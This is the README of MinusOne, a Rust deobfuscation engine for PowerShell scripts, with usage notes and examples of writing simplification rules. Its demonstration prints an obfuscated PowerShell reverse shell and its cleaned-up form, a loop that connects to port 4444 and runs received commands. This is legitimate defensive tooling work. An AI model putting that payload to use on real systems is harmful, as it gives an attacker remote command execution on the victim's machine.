# minusone

$$\textit{obfuscation}^{-1}$$

Reverse operation of script obfuscation

## Description

MinusOne is a deobfuscation engine focused on scripting languages. MinusOne is based on [tree-sitter](https://tree-sitter.github.io/tree-sitter/) for parsing, and will apply a set of rules to infer node values and simplify expressions.

MinusOne supports the following languages:
* Powershell

By taking the following example from [`Invoke-Obfuscation`](https://github.com/gh0x0st/Invoke-PSObfuscation/blob/main/layer-0-obfuscation.md#final-payload):

```
$RIh2YMeUrLleflu = & (("bkJFpDG8iOerRVvo9xzsfjABHPgI5WYq4-$(0+6)h3ynN1aTEKXudm27LQlwtMCc0SUZ")[$(0-0+0-39+39+39),$(0-0+0+10),$(54),$(0-0+33),$(0+0+0-0+0-9+9+9),$(0+0+0),21,$(0-0+0+10),$($(58)),(55)] -join '') $([char]($(0+6)*$(83)/$(0+6))+[char]($(46+46+0-0-46)+$(121+121+0+0-121)-$(46+46+0-0-46))+[char]($(0-0+0-0-102+102+102)*$(0-0+0+115)/$(0-0+0-0-102+102+102))+[char]($(0+0+0)+$(116)-$(0+0+0))+[char]($(0+0-0-0+3)+(((101)))-$(0+0-0-0+3))+[char]($(((28)))*(109)/$(((28))))+[char]($(1)*$(46+46+0-0-46)/$(1))+[char]($(0+0+0)+$(0-0+0-0-0+78)-$(0+0+0))+[char]($(0+0+0+19)+(((101)))-$(0+0+0+19))+[char](118+$(116)-118)+[char]($(0-0+0-39+39+39)*$(46+46+0-0-46)/$(0-0+0-39+39+39))+[char]($(0+0+0)+$(83)-$(0+0+0))+[char]($(15+15+0+0+0+0-15)*$((111))/$(15+15+0+0+0+0-15))+[char]($(11)*$(0+0+0+99)/$(11))+[char]($(0+0+0)+$(0+0-107+107+107)-$(0+0+0))+[char](24+(((101)))-24)+[char]($((75))*$(116)/$((75)))+[char]($(60)*$(0-0+0+115)/$(60))+[char]($(0+0+0)+$(46+46+0-0-46)-$(0+0+0))+[char]($(0+0+0)+84-$(0+0+0))+[char]($(0+0+0)+$($($(67)))-$(0+0+0))+[char]($($(100))+80-$($(100)))+[char]($(0-0-0-5+5+5)+$($($(67)))-$(0-0-0-5+5+5))+[char]($(0+0+0+19)*$(108)/$(0+0+0+19))+[char]($(94+94+0-0+0-94)+(($(105)))-$(94+94+0-0+0-94))+[char]($(0+0+0+0+113)+(((101)))-$(0+0+0+0+113))+[char]($(108)+110-$(108))+[char]($(0+0+0)+$(116)-$(0+0+0)))("Eztpe9HAJhx0CsSoVdQai.inkFe35GxjHEZugbD17Ur.fLgCcGp4z.H2RDbaXwLSUzI46Oo8xA".replace('fLgCcGp4z',0).replace('Eztpe9HAJhx0CsSoVdQai',127).replace('inkFe35GxjHEZugbD17Ur',0).replace('H2RDbaXwLSUzI46Oo8xA',1),4444);$VQzo0MZvYst = (& (("Kq6lEhs17kBIGeSjvXwAr4cYnfT5WLPRxOyZQd8U-b9omziMCgu3J0FpVaHDN2t")[$(46+46+0-0-46),24,$(0-0+0+16),$(43),$(0+0+0-0+0-9+9+9),(13),(($(40))),(13),$(32+32+0+0-32),(55),$(20),(13),$(0+6),$(0+6),$(46+46+0-0-46),$(43),24] -join '') ([string]::join('', ( (36,$(82),73,$(104),(((50))),$(0+0+89),$(77),(((101))),(($(85))),$(0+0-0+114),$(0-0+76),$(108),(((101))),$(0-0+0-0-102+102+102),$(108),$(117+117+0+0-0+0-117),$(46+46+0-0-46),$(71),(((101))),$(116),$(83),$(116),$(0+0-0+114),(((101))),$((97)),(109),(($(40))),41) |%{ ( [char][int] $_)})) | % {$_}));[byte[]]$aKydB9RXv2thuU = $(0+0+0)..$($($(65535)))|<##>%{<#$(0+0-0-0+3)GT4BWEX1Kon2#>$_}|& (("NAMCqn9H23mOzfrZeP461KyWULshapxR-jIJviEo0kQtFDlGwuST7dBcVbYg8X5")[(44),$(0-0+0-39+39+39),$(14),(((38))),$(((28))),(55),$(27+27+0+0+0-27),$(32+32+0+0-32),$(11),($((57))),$(0-0+33),$(0-0+0+16),(55),$(43)] -join ''){$(0+0+0)};while(($cvB4PPcLVI = $VQzo0MZvYst.Read($aKydB9RXv2thuU, $(0+0+0), $aKydB9RXv2thuU.Length)) -ne $(0+0+0)){;$WcDamZqInJS7HDr3 = (& (("bkJFpDG8iOerRVvo9xzsfjABHPgI5WYq4-$(0+6)h3ynN1aTEKXudm27LQlwtMCc0SUZ")[$(0-0+0-39+39+39),$(0-0+0+10),$(54),$(0-0+33),$(0+0+0-0+0-9+9+9),$(0+0+0),21,$(0-0+0+10),$($(58)),(55)] -join '') -TypeName $([char]($(116)+$(83)-$(116))+[char]($(0+0+0)+$(121+121+0+0-121)-$(0+0+0))+[char]((($(85)))*$(0-0+0+115)/(($(85))))+[char]($(0+0+52)+$(116)-$(0+0+52))+[char]($(43)+(((101)))-$(43))+[char]($(14)+(109)-$(14))+[char](24+$(46+46+0-0-46)-24)+[char]($(0+0+0)+84-$(0+0+0))+[char]($(0+0+0)+(((101)))-$(0+0+0))+[char]($(0+0+0)+$(0-120+120+120)-$(0+0+0))+[char](24+$(116)-24)+[char](($((57)))+$(46+46+0-0-46)-($((57))))+[char]($(0+0+0)+((65))-$(0+0+0))+[char]($(121+121+0+0-121)+$(83)-$(121+121+0+0-121))+[char]($(0+0+0)+$($($(67)))-$(0+0+0))+[char]($(0+0-0+47)*73/$(0+0-0+47))+[char]($((75))+73-$((75)))+[char]($(0+0-0-0+3)*69/$(0+0-0-0+3))+[char]($(0+0-0-0+3)*110/$(0+0-0-0+3))+[char]($(0+0+0)+$(0+0+0+99)-$(0+0+0))+[char]($(94+94+0-0+0-94)*$((111))/$(94+94+0-0+0-94))+[char]((109)*$($(100))/(109))+[char]($(0+0+0)+(($(105)))-$(0+0+0))+[char](((61))+110-((61)))+[char]($(23+23+0+0+0-0-23)+$(0+0-0+0-103+103+103)-$(23+23+0+0+0-0-23)))).GetString($aKydB9RXv2thuU,$(0+0+0), $cvB4PPcLVI);$FP8DpgPcK0IovuDHPZ4p = (& (("jc79lahBD50zmLSoGOAWJ6bEVTCZn-gfHRqQIs83k1KMyvYi2UPxdwFrptueX4N")[36,$(((28))),$(($(45))),$(15+15+0+0+0+0-15),(($(40))),$(0+0-0-0+59),$(29),$(23+23+0+0+0-0-23),($(51)),($($(56))),(55),$(0+0-0-0+59),$((37)),$((37)),$(0+0-0+47),$(15+15+0+0+0+0-15),$(((28)))] -join '') $WcDamZqInJS7HDr3 2>&1 |<##>%{<#c8jKdSaJDXH#>$_}| & (("r2-$(0-0-0-5+5+5)kGjMq4wbPSpReXc3861oBCfYULI0nEhaTvylDxHWuzVJsA79igmtNKdFOQZ")[$(60),(44),(55),$(0-0+2),(13),(55),$(0+0+0),$(0+0+52),$(32+32+0+0-32),$(53+53+0-53)] -join '') );$FP8DpgPcK0IovuDHPZ4p2 = $FP8DpgPcK0IovuDHPZ4p + 'P'+'S'+' ' + (& (("Xm965ksBJzH0P4Tx3fq-uV2YDWvw1pGA8OQdEoUiZyIKRbL7tMjNnerlacgCFhS")[$($(30)),$(53+53+0-53),$(0+48),$(0+0+0+19),$(46+46+0-0-46),$((37)),($((57))),($($(56))),$(0+48),$(0-0+0-39+39+39),$((37)),$(0+0+52)] -join '')).Path + $('>'+' ');$6j = ([text.encoding]::ASCII).GetBytes($FP8DpgPcK0IovuDHPZ4p2);$VQzo0MZvYst.Write($6j,$(0+0+0),$6j.Length);& (("kOlASeNV-$(0+0+0-0+0-9+9+9)oIy0izxUGYCWLq1Bm7EuH3dK6rjPc8shnJMtwQR45XTpbfDFaZ2gv")[$(14),$(0+0-0-0+0-42+42+42),$(0+0+0+62),$(0-0+0+10),$(0+0+0),$(0-0-0-5+5+5),(8),$(0-0-0-5+5+5),$(0-0+0+16),$(53+53+0-53),35,$(0-0-0-5+5+5),(($(40))),(($(40))),$(14),$(0-0+0+10),$(0+0-0-0+0-42+42+42)] -join '') ([string]::join('', ( (36,$(86),$(81+81+0+0-81),$(122),$((111)),$(0+48),$(77),$(((90))),118,$(0+0+89),$(0-0+0+115),$(116),$(46+46+0-0-46),$($(70)),$(108),$(117+117+0+0-0+0-117),$(0-0+0+115),$(104),(($(40))),41) |%{ ( [char][int] $_)})) | % {$_})};& (("$(0-0-0-5+5+5)h7KWXyczN0sentgPElZ-QviSjuR9L1mdf3pDVTUo8Gqk4CYrHxBA2baIw6MFOJ")[$(23+23+0+0+0-0-23),(13),$($($(22))),(($(40))),(44),12,$(20),12,(((50))),35,$(0+48),12,$(11),$(11),$(23+23+0+0+0-0-23),(($(40))),(13)] -join '') ([string]::join('', ( (36,$(82),73,$(104),(((50))),$(0+0+89),$(77),(((101))),(($(85))),$(0+0-0+114),$(0-0+76),$(108),(((101))),$(0-0+0-0-102+102+102),$(108),$(117+117+0+0-0+0-117),$(46+46+0-0-46),$($($(67))),$(108),$((111)),$(0-0+0+115),(((101))),(($(40))),41) |%{ ( [char][int] $_)})) | % {$_})
```

It will produce the following output :

```powershell
$rih2ymeurlleflu = & "New-Object" "System.Net.Sockets.TCPClient" ("127.0.0.1", 4444)
$vqzo0mzvyst = & "invoke-expression" ("$RIh2YMeUrLleflu.GetStream()" | % { $_ })
[byte[]]$akydb9rxv2thuu = 0..65535 | % { $_ } | & "ForEach-Object" { 0 }

while ( ($cvb4ppclvi = $vqzo0mzvyst.read($akydb9rxv2thuu, 0, $akydb9rxv2thuu.length)) -ne 0 ) {
	$wcdamzqinjs7hdr3 = (& "New-Object" -typename "System.Text.ASCIIEncoding").getstring($akydb9rxv2thuu, 0, $cvb4ppclvi)
	$fp8dpgpck0iovudhpz4p = & "Invoke-Expression" $wcdamzqinjs7hdr3 2>&1  | % { $_ } | & "Out-String" 
	$fp8dpgpck0iovudhpz4p2 = $fp8dpgpck0iovudhpz4p + "P" + "S" + " " + (& "Get-Location").path + "> "
	$6j = [text.encoding]::ascii.getbytes($fp8dpgpck0iovudhpz4p2)
	$vqzo0mzvyst.write($6j, 0, $6j.length)
	& "invoke-expression" ("$VQzo0MZvYst.Flush()" | % { $_ })
}

& "invoke-expression" ("$RIh2YMeUrLleflu.Close()" | % { $_ })
```

## Usage

MinusOne is written in Rust and can be built, deployed or executed through the Cargo package manager:

```
cargo run --features="minusone-cli" -- --path test.ps1
```

Python bindings are also available, allowing MinusOne to be easily integrated into Jupyter notebooks for example.

## What is a Rule?

A rule will produce a result when visiting a particular node, depending on its children or parent. A rule will be called when entering and leaving a node.

Creating a rule for Powershell is as easy as implementing the `RuleMut` trait :

```rust
#[derive(Default)]
pub struct MyRule;

impl<'a> RuleMut<'a> for MyRule {
    type Language = Powershell;

    fn enter(&mut self, node: &mut NodeMut<'a, Self::Language>, flow: BranchFlow) -> MinusOneResult<()>{
        Ok(())
    }

    fn leave(&mut self, node: &mut NodeMut<'a, Self::Language>, flow: BranchFlow) -> MinusOneResult<()>{
        Ok(())
    }
}
```

The `enter()` method is called before visiting the node, and the `leave()` method will be called when leaving the node, so after visiting the node and all its children.

### Example: A rule that adds two integers

In this example we will see how to infer value from :

```powershell
$a = 40 + 2
```

To :

```powershell
$a = 42
```

The first rule we need is a rule to parse integers :

```rust
#[derive(Default)]
pub struct ParseInt;

impl<'a> RuleMut<'a> for ParseInt {
    type Language = Powershell;

    fn enter(&mut self, node: &mut NodeMut<'a, Self::Language>, flow: BranchFlow) -> MinusOneResult<()>{
        Ok(())
    }

    fn leave(&mut self, node: &mut NodeMut<'a, Self::Language>, flow: BranchFlow) -> MinusOneResult<()>{
        let view = node.view();
        let token = view.text()?;
        match view.kind() {
            "decimal_integer_literal" => {
                if let Ok(number) = token.parse::<i32>() {
                    node.set(Raw(Num(number)));
                }
            },
            _ => ()
        }

        Ok(())
    }
}
```

The rule will be processed when leaving a node of type `decimal_integer_literal` in the `tree-sitter-powershell` grammar, 
then it will try to parse the token by using the [`std::str::parse`](https://doc.rust-lang.org/std/primitive.str.html#method.parse) method (`token.parse::<i32>()`).

A more complete implementation of this rule can be found [here](src/ps/integer.rs).

Now we will create a new rule that will infer the value of two nodes involved in a `+` operation. This rule will be focused on the `additive_expression` node type.

It will check if the node has three children:

* The first one must inferred by the previous rule as an integer
* The second one must be the token `+`
* The third one must inferred by the previous rule as an integer

```rust
#[derive(Default)]
pub struct AddInt;

impl<'a> RuleMut<'a> for AddInt {
    type Language = Powershell;

    fn enter(&mut self, _node: &mut NodeMut<'a, Self::Language>, flow: BranchFlow) -> MinusOneResult<()>{
        Ok(())
    }

    fn leave(&mut self, node: &mut NodeMut<'a, Self::Language>, flow: BranchFlow) -> MinusOneResult<()>{
        let node_view = node.view();
        if node_view.kind() == "additive_expression" {
            if let (Some(left_op), Some(operator), Some(right_op)) = (node_view.child(0), node_view.child(1), node_view.child(2)) {
                match (left_op.data(), operator.text()?, right_op.data()) {
                    (Some(Raw(Num(number_left))), "+", Some(Raw(Num(number_right)))) => node.set(Raw(Num(number_left + number_right))),
                    _ => {}
                }
            }
        }
        Ok(())
    }
}
```

Then we can apply these rule to the Powershell tree generated by `tree-sitter-powershell`:

```rust

let mut tree = build_powershell_tree("40 + 2").unwrap();

tree.apply_mut(&mut (
    ParseInt::default(), 
    Forward::default(), 
    AddInt::default()
)).unwrap();

```

The `Forward` rule is a particular rule that will forward a node's inferred type in case a node is not used in a semantic way, which is mainly due to how the Powershell grammar was generated.

Then, you can print the Powershell result by using the object `Linter`:

```rust
let mut ps_linter_view = Linter::new();
ps_linter_view.print(&tree.root().unwrap()).unwrap();

// => 42
```

## Rules for Powershell

When using the `Engine` object, you will automatically use predefined rules designed for Powershell. These can be found in [src/ps/mod.rs](src/ps/mod.rs) :

```rust
pub type RuleSet = (
    Forward,            // Special rule that will forward inferred value in case the node is transparent
    ParseInt,           // Parse integer
    AddInt,             // +, - operations on integer
    MultInt,            // *, / operations on integer
    ParseString,        // Parse string token, including multiline strings
    ConcatString,       // String concatenation operation
    Cast,               // cast operation, like [char]0x65
    ParseArrayLiteral,  // It will parse array declared using separate value (integer or string) by a comma
    ParseRange,         // It will parse .. operator and generate an array
    AccessString,       // The access operator [] apply to a string : "foo"[0] => "f"
    JoinComparison,     // It will infer join string operation using the -join operator : @('a', 'b', 'c') -join '' => "abc"
    JoinStringMethod,   // It will infer join string operation using the [string]::join method : [string]::join('', @('a', 'b', 'c'))
    JoinOperator,       // It will infer join string operation using the -join unary operator -join @('a', 'b', 'c')
    PSItemInferrator,   // PsItem is used to inferred commandlet pattern like % { [char] $_ }
    ForEach,            // It will used PSItem rules to inferred foreach-object command
    StringReplaceMethod,// It will infer replace method apply to a string : "foo".replace("oo", "aa") => "faa"
    ComputeArrayExpr,   // It will infer array that start with @
    StringReplaceOp,    // It will infer replace method apply to a string by using the -replace operator
    StaticVar,          // It will infer value of known variable : $pshome, $shellid
    CastNull,           // It will infer value of +$() or -$() which will produce 0
    ParseHash,          // Parse hashtable
    FormatString,       // It will infer string when format operator is used ; "{1}-{0}" -f "Debug", "Write"
    ParseBool,          // It will infer boolean operator
    Comparison,         // It will infer comparison when it's possible
    Not,                // It will infer the ! operator
    ParseType,          // Parse type
    DecodeBase64,       // Decode calls to FromBase64
    FromUTF,            // Decode calls to FromUTF{8,16}.GetText
    Length,             // Decode attribute length of string and array
    BoolAlgebra,        // Add support to boolean algebra (or and)
    Var,                // Variable replacement in case of predictable flow
);
```

## Roadmap

* More accurate parsing of Powershell HashTables
* Basic support of Javascript

